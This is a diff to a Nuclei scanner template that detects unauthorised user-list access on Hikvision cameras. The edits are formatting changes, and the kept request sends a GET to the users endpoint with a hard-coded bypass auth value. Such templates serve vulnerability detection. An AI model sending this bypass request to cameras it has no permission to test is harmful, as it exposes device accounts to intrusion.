@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: hikvision-camera-management-unauthorized-access-user-list
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://www.seebug.org/vuldb/ssvid-96469
   tags: hikvision,camera,user
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/Security/users?auth=YWRtaW46MTEK"
